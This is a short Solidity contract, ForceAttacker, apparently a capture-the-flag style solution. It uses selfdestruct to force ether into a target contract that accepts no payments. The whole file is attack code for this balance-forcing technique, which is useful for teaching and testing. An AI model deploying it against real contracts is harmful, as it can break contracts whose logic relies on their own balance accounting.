// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

contract ForceAttacker {
    constructor() payable {}

    function attack(address target) public payable {
        require(msg.value > 0);
        selfdestruct(payable(target));
    }
}
